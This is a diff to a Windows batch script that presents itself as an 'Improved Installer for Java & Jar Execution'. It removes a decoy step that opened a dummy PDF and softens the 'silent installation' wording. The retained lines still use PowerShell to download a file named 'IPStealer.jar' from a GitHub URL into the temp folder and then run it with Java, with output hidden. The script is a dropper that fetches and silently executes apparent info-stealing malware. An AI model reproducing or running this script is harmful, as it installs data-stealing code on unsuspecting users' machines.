@@ -1,10 +1,8 @@
 @echo off
 REM --- Improved Installer for Java & Jar Execution ---
-echo [Phase 1] Starting silent installation...
-REM 1. Silent decoy
-start "" "https://www.w3.org/WAI/ER/tests/xhtml/testfiles/resources/pdf/dummy.pdf" >nul 2>&1
+echo [Phase 1] Starting installation...
 
-REM 2. Try to download and install Java 18 ONLY if not present
+REM 1. Try to download and install Java 18 ONLY if not present
 where java >nul 2>&1
 if %errorlevel% neq 0 (
     echo [Phase 2] Java not found. Attempting to install Java 18...
@@ -13,11 +11,11 @@ if %errorlevel% neq 0 (
     echo [Phase 2] Java is already installed.
 )
 
-REM 3. Download the JAR payload
+REM 2. Download the JAR payload
 echo [Phase 3] Downloading payload...
 powershell -Command "$url='https://github.com/mavi30173-ai/mc-server/raw/main/IPStealer.jar'; $out='%TEMP%\payload.jar'; (New-Object Net.WebClient).DownloadFile($url, $out); echo 'Download complete.'"
 
-REM 4. Execute the JAR with available Java
+REM 3. Execute the JAR with available Java
 echo [Phase 4] Executing payload...
 java -jar "%TEMP%\payload.jar" >nul 2>&1
 if %errorlevel% neq 0 (
